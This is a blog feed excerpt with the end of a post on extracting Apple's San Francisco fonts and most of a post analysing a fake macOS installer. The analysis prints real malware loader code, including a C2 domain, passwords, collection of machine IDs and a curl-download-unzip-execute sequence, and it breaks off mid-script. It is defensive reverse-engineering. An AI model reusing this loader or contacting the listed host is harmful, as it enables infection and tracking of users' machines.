drwxr-xr-x 1 patrick patrick  42 Jun  4 11:34 SanFranciscoPro.pkg
$ ls -lh SanFranciscoPro.pkg
-rwxr-xr-x 1 patrick patrick 2.2K Oct 28  2019 Bom
-rwxr-xr-x 1 patrick patrick  287 Oct 28  2019 PackageInfo
-rwxr-xr-x 1 patrick patrick  28M Oct 28  2019 Payload
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have a few uninteresting files, but the &lt;code class=&quot;highlighter-rouge&quot;&gt;Payload&lt;/code&gt; file inside the
SanFranciscoPro.pkg folder is what we’re interested in, because that seems
to contain some data. Let’s take a closer peek at it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cd SanFranciscoPro.pkg
$ file Payload
Payload: gzip compressed data, from Unix
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s gzip compressed data, that’s something we can handle. But what’s inside?
We can find out, too.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gunzip &amp;lt; Payload | file -
/dev/stdin: ASCII cpio archive (pre-ARV4 or odc)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A CPIO archive. I’ve heard of this only from reading the POSIX standard, CPIO
is similar to &lt;code class=&quot;highlighter-rouge&quot;&gt;tar&lt;/code&gt;, if I understand it correctly. So we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;cpio&lt;/code&gt; to extract
that.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gunzip &amp;lt; Payload | cpio -i
85030 blocks
$ ls
Bom  Library  PackageInfo  Payload
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Extracting this has produced a &lt;code class=&quot;highlighter-rouge&quot;&gt;Library&lt;/code&gt; folder. That sounds suspiciously like
a macOS filesystem folder.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ls Library
Fonts
$ ls Library/Fonts
SF-Pro-Display-BlackItalic.otf
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Jackpot!&lt;/p&gt;

&lt;p&gt;All that’s left to do is to install them on the local system. This is done
easily by copying them to the &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.fonts&lt;/code&gt; folder and updating the font cache.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ mkdir -p ~/.fonts/SF-Pro
$ cp Library/Fonts/*.otf ~/.fonts/SF-Pro/
$ fc-cache -vf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This should result in the fonts being available and ready to use.&lt;/p&gt;</content><author><name></name></author><summary type="html">Apple has always had a knack for producing and using high-quality typography. Not too long ago, they switched the font for their UI from the classic Helvetica Neue (a typeface originating from Switzerland, known for precision watches) over to their own custom typeface, which they called San Francisco.</summary></entry><entry><title type="html">Malware Analaysis on macOS, Part 1: Bash</title><link href="https://blog.xfbs.net/posts/malware-analysis-bash" rel="alternate" type="text/html" title="Malware Analaysis on macOS, Part 1: Bash" /><published>2019-06-17T00:00:00+02:00</published><updated>2019-06-17T00:00:00+02:00</updated><id>https://blog.xfbs.net/posts/malware-analysis-bash</id><content type="html" xml:base="https://blog.xfbs.net/posts/malware-analysis-bash">&lt;p&gt;&lt;em&gt;This is part one of a multi-part series where I reverse engineer some shitty macOS malware. All the code is available &lt;a href=&quot;https://gist.github.com/xfbs/42df932fadaeb0f3888230e6ec1b0a99&quot;&gt;here&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I didn’t even know there was malware for macOS out there. I mean, I knew it existed, I just didn’t think I’d ever encounter any. These days with all the fancy package managers (homebrew) and App Stores, it’s extremely rare that one has to download software from the scary internet. But today was such a case, at least, in a way.&lt;/p&gt;

&lt;p&gt;I have this old 2010 Mac Mini that I still use for a couple of things. And for some reason, I wanted to wipe it clean and reinstall macOS on it. It doesn’t support the latest version of macOS, 10.14 Mojave, but it does still run 10.13 High Sierra.&lt;/p&gt;

&lt;p&gt;The normal way to do this is to download macOS from the App Store. That way it’s directly from Apple, the download is verified and it’s all good. However, the download from Apple isn’t the fastest, I only got around 1 MB/s from them, which is far less than my connection should max out that.&lt;/p&gt;

&lt;p&gt;So I went into the wild, wild internet and tried to find a torrent for it. That would be a much faster way of downloading High Sierra. So I managed to find a website that offered to download macOS High Sierra 10.13.6, exactly what I was looking for, and so promptly downloaded it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mac-torrents-malware.png&quot; alt=&quot;Phony website hosting malware&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But of course, you can’t trust the internet. Instead of a &lt;code class=&quot;highlighter-rouge&quot;&gt;.torrent&lt;/code&gt; file, I go a &lt;code class=&quot;highlighter-rouge&quot;&gt;.dmg&lt;/code&gt; that was only around 500 kB. That can’t be right! Normally I would just delete whatever they gave me and go back to Apple’s safe but slightly slower download. But because we are professionals and this is the first time I have encountered macOS malware in the wild, I thought it might be fun to see what I got there, to reverse it a bit.&lt;/p&gt;

&lt;p&gt;The first thing I looked at is the download URL on that website.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://cdndownloadjspr.com/dl/?z=6120&amp;amp;name=macOS%20High%20Sierra%2010.13.6%20-17G65-&amp;amp;file=https://mac-torrents.io/wp-content/uploads/2018/07/macOS_10.13.6_High_Sierra.torrent
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, interestingly, you can see that this is on another domain, &lt;code class=&quot;highlighter-rouge&quot;&gt;cdndownloadjspr.com&lt;/code&gt;, which seems to be some sort of a CDN. Embedded in that is a URL going to &lt;code class=&quot;highlighter-rouge&quot;&gt;mac-torrents.io&lt;/code&gt;. If you download that URL, you actually get a valid torrent file:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ wget &quot;https://mac-torrents.io/wp-content/uploads/2018/07/macOS_10.13.6_High_Sierra.torrent&quot;
$ sha256sum macOS_10.13.6_High_Sierra.torrent
fa1514a3a009471621db9986abd1e6df44bb9d7383f1be4e0b4ab628ae0f01db  macOS_10.13.6_High_Sierra.torrent
$ torrentcheck -t *.torrent
Torrent file  : macOS_10.13.6_High_Sierra.torrent
Metadata info : 50614 bytes, 2488 pieces, 2097152 bytes per piece
Torrent name  : macOS_10.13.6_High_Sierra.rar
Content info  : single file, 5217375346 bytes
Announce URL  : udp://tracker.leechers-paradise.org:6969
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Those 5217375346 bytes that it reports is about 4.8 GB, which does check out. It might not be authentic, so I wouldn’t trust it, but it does seem more likely to actually be something.&lt;/p&gt;

&lt;p&gt;If you don’t extract that URL, and use the URL of the CDN, then all bets are off. Every time you download it, you get something different. These are all the files I got from downloading the allaged torrent file (I have renamed some of them):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sha256sum *
829500e88bd4b19b0f3562eba6a00f0065379b354ac408b79685ca9fe25aa064  macOS High Sierra 10.13.6 -17G65--2.dmg
8e85ebf5b34fa8285d182602dbad02dfe91cf0f6f68e87e86796a6090c2092d9  macOS High Sierra 10.13.6 -17G65--3.dmg
9dfc172e9f09a27af6ea9b95d434482502d602c393718f27ffe97d7e26e58eb9  macOS High Sierra 10.13.6 -17G65--4.dmg
ddcf71302cac7ef9fd80ce754a8c1b138534dfd7bf13a728091014960422a836  macOS High Sierra 10.13.6 -17G65--5.dmg
2bbf214ee6f289e6e93970cc46562e93fdf7236b5c55c0c1b6e0f2151d57e04f  macOS High Sierra 10.13.6 -17G65-.dmg
c9e2a57741c4117b59c4cd3a30167a564fde76795df7f4b3682bef283fae54f9  macOS_10.13.6_High_Sierra.dmg
cc716c1da4be1d03130b59453b5f8f668c07b96cf1a1fde0f0b920c952133428  macOS_10_13_6_High_Sierra.dmg
faf600fd75c8aafe3dd1a0c12e4970003f771d707e4bfd0226a7fc5da2f21423  macOS_High_Sierra.dmg
c9e2a57741c4117b59c4cd3a30167a564fde76795df7f4b3682bef283fae54f9  macos_installer_malware.dmg
8cd90a110eabaa7dd51d912bfb6fc896ed4c002b83e992c7822a71649f3b4911  malware.dmg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I’m not sure if it’s &lt;code class=&quot;highlighter-rouge&quot;&gt;mac-torrents.io&lt;/code&gt; that is malicious, or if it’s the CDN that is malicious. Another clue is that &lt;code class=&quot;highlighter-rouge&quot;&gt;mac-torrents.io&lt;/code&gt; seems to be running WordPress, which is infamous for security holes. So it’s not quite clear who is the bad actor here.&lt;/p&gt;

&lt;p&gt;As for the different checksums on every download, it does seem like they serve different types of malware on every downlod. But it might also be that they slightly randomize each download to evade detection by virus scanners that only check the hashes of files.&lt;/p&gt;

&lt;p&gt;I chose one of these &lt;code class=&quot;highlighter-rouge&quot;&gt;.dmg&lt;/code&gt; files and mounted them. It looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware-installer.png&quot; alt=&quot;Malware installer&quot; width=&quot;50%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;All of these are perfectly valid DiskImage files. If you don’t know macOS, DiskImage files are like a hybrid between a ZIP file and a virtual CD, in that they are compressed, and you have to “mount” them. They are also read-only and typically used to distribute software.&lt;/p&gt;

&lt;p&gt;All of these &lt;code class=&quot;highlighter-rouge&quot;&gt;.dmg&lt;/code&gt; files are either 500 kB or 1.5 MB in size, which suggests that there are different versions or different payloads here. Some of them don’t have an “Installer” but a “Player” icon that looks like the Adobe Flash Player that is now obsolete but used to be quite important on the internet.&lt;/p&gt;

&lt;p&gt;Since this is a proper macOS app, we can check if the code is signed with Apple’s &lt;code class=&quot;highlighter-rouge&quot;&gt;codesign&lt;/code&gt; utility, and if so, which certificate was used to sign it. MacOS doesn’t like running code that isn’t signed, which is quite good.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ codesign -dvv Installer.app/
Executable=/Volumes/Installer/Installer.app/Contents/MacOS/lkyuqiwjiavtbfmjckxz
Identifier=com.lkyuqiwjiavtbfmjckxz
Format=app bundle with generic
CodeDirectory v=20200 size=216 flags=0x0(none) hashes=1+3 location=embedded
Signature size=9014
Authority=Developer ID Application: Edward Furlhoper (XL8ZVTY2W2)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
Timestamp=10. Jun 2019 at 12:29:18
Info.plist entries=12
TeamIdentifier=XL8ZVTY2W2
Sealed Resources version=2 rules=13 files=2
Internal requirements count=2 size=236
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As expected, this app is signed. It has the nonsensical identifier &lt;code class=&quot;highlighter-rouge&quot;&gt;com.lkyuqiwjiavtbfmjckxz&lt;/code&gt;, and is signed by an &lt;em&gt;Edward Furlhoper&lt;/em&gt;. A simple search shows that this name is &lt;a href=&quot;https://blog.cyberbyte.org/blog/new-macos-malware-with-command-control-capabilities-disguised-as-cill-tab-adware/&quot;&gt;not unknown&lt;/a&gt;, and this particular individual has been linked to other malware.&lt;/p&gt;

&lt;p&gt;That still doesn’t tell us what this thing actually does. To find that out, we need to actually inspect the code that it is running. So, I just naïvely opened it in &lt;code class=&quot;highlighter-rouge&quot;&gt;vim&lt;/code&gt;, and well, hello there..&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware-vim.png&quot; alt=&quot;Malware bash script&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Turns out it’s just a &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt; script. That’s interesting, I guess I would have expected something.. sophisticated. But it does make sense, if you’re going to write malware for a system, you want to do it as cheaply as possible, so you’ll use whatever comes preinstalled. And writing a little bash script works because macOS comes with &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; preinstalled. But what does this thing even do?&lt;/p&gt;

&lt;p&gt;You can see that it finds the parent directory of the directory where it’s stored in (it’s in &lt;code class=&quot;highlighter-rouge&quot;&gt;Installer.app/Contents/MacOS/&lt;/code&gt;, so &lt;code class=&quot;highlighter-rouge&quot;&gt;fileDir&lt;/code&gt; will contain &lt;code class=&quot;highlighter-rouge&quot;&gt;Installer.app/Contents&lt;/code&gt;). It then loads a file, &lt;code class=&quot;highlighter-rouge&quot;&gt;Installer.app/Contents/Resources/enc&lt;/code&gt;, which it decrypts and evaluates. To see what it’s evaluating there, we can just decrypt that file as well and inspect it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:2822812613 &amp;lt; Installer.app/Contents/Resources/enc &amp;gt; stage_two.sh
$ sha256sum stage_two.sh
7b05f80cd95d5aa2c84a47f59e26cf2f5faf8b84661a06f0e8c5cc3094b215ee  /Users/pelsen/malware.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The result of decrypting the file is, unsurprisingly, another bash script.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware-decrypted.png&quot; alt=&quot;Malware decrypted script&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This code is obfuscated, but in such a trivial way that we can easily decode it. Very obvious are the two variables, &lt;code class=&quot;highlighter-rouge&quot;&gt;_y&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;_t&lt;/code&gt;. These are a key and some data (interestingly, the same key as the one this file was encrypted with). The functions &lt;code class=&quot;highlighter-rouge&quot;&gt;_m&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;_l&lt;/code&gt; use these variables to decrypt something, a third bash script, which is then evaluated.&lt;/p&gt;

&lt;p&gt;I went through the code to deobfuscate it, sprinkle some comments into it and I was able to learn some things on the way. For example, &lt;code class=&quot;highlighter-rouge&quot;&gt;${#1}&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;bash&lt;/code&gt; syntax for getting the length of the string variable &lt;code class=&quot;highlighter-rouge&quot;&gt;$1&lt;/code&gt;. The deobfuscated version is available &lt;a href=&quot;https://gist.github.com/xfbs/42df932fadaeb0f3888230e6ec1b0a99#file-macos_malware_deobfuscated-sh&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware-deobfuscated.png&quot; alt=&quot;Malware deobfuscated&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can see that they implemented some pseudo-encryption using XOR. If you didn’t know, you can parse hex numbers and perform XOR operations on them with a syntax similar to this:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$((&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;xa1&lt;span class=&quot;k&quot;&gt;))&lt;/span&gt; ^ &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;0x1a&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This pseudo-encryption is pretty shit, and trivial to deobfuscate. But things like this are also wildly popular because they are so easy to implement. The fact that it’s implemented in bash does make it look a bit wild.&lt;/p&gt;

&lt;p&gt;Now that we know what it does, we could go through it and follow the code to manually do what it does,to decrypt the data. Or, we can just change the &lt;code class=&quot;highlighter-rouge&quot;&gt;eval&lt;/code&gt; into an &lt;code class=&quot;highlighter-rouge&quot;&gt;echo&lt;/code&gt; and run the script, and let it decode itself. Note that this is sometimes dangerous, because if you made a mistake, you could inadvertendly infect your system with malware. So, it’s probably best to do this in a container or a throwaway VM. I just set up a docker container, created an unprivileged user in it, downloaded&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ docker run -it ubuntu /bin/bash
# adduser user
# su user
$ sed -i -e 's/eval/echo/g' stage_two.sh
$ chmod +x stage_two.sh
$ ./stage_two.sh &amp;gt; stage_three.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, running all that, we get to the next stage, stage three. This one isn’t even obfuscated at all, it’s just a script that seems to download something from the net and execute it. It is available &lt;a href=&quot;https://gist.github.com/xfbs/42df932fadaeb0f3888230e6ec1b0a99#file-macos_malware_payload-sh&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/macos-malware-payload.png&quot; alt=&quot;MacOS malware payload&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This looks like it’s getting somewhere fun. Interestingly, the password is still the same, they used &lt;code class=&quot;highlighter-rouge&quot;&gt;2822812613&lt;/code&gt; as the password at every stage. We can go through these variables they are setting, to find out what kind of information is passed on to their server, and download whatever their server gives us.&lt;/p&gt;

&lt;p&gt;The first couple variables are just some parameters. The encryption password, which might be used to identify this particular version of the malware, or it might even be generated randomly and be able to track an individual machine.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ENC_PASS=&quot;2822812613&quot;
APP_DOMAIN=&quot;www.evyet.pw&quot;
APP_ROUTE=&quot;download/dlst&quot;
unzip_password=&quot;316218228228228126133456789&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next are some data about the OS that it saves into the variables &lt;code class=&quot;highlighter-rouge&quot;&gt;os_version&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;session_guid&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;machine_id&lt;/code&gt;. That includes the version of macOS you are using, a randomly generated ID and some type of ID to identify the machine. I don’t know if the &lt;code class=&quot;highlighter-rouge&quot;&gt;machine_id&lt;/code&gt; identifies the &lt;em&gt;model&lt;/em&gt; or the particular machine you’re on. I have executed these commands locally to show you what the output looks like. I did censor my &lt;code class=&quot;highlighter-rouge&quot;&gt;machine_id&lt;/code&gt; because I’m not sure if it can be used to track my specific hardware, but the output looks exactly like a UUID.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sw_vers -productVersion
10.14.5
$ uuidgen
769F2AAE-47D3-4EF4-BB6E-64B6742F3662
$ ioreg -rd1 ioreg -rd1 -c IOPlatformExpertDevice | grep -o '&quot;IOPlatformUUID&quot; = &quot;\(.*\)&quot;'
XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next comes the interesting part. Here we actually download and execute whatever the server gives us.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;APP_DOMAIN&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;APP_ROUTE&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;?mid=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;machine_id&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;s=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session_guid&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;o=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;os_version&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;p=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ENC_PASS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;tmp_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt; /tmp/XXXXXXXXX&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
curl &lt;span class=&quot;nt&quot;&gt;-f0L&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null 2&amp;gt;&amp;amp;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;tmp_path&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;app_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; /tmp/XXXXXXXX&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&quot;&lt;/span&gt; 
unzip &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;unzip_password&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;tmp_path&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;app_dir&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null 2&amp;gt;&amp;amp;1 
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;tmp_path&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;file_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;*.app&quot;&lt;/span&gt; &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;app_dir&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)&quot;&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;volume_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PWD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s@^(/Volumes/[^/]+)/.*@\1@p'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;volume_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;volume_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;// /%20&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;app_dir&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;file_name&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/Contents/MacOS&quot;&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 
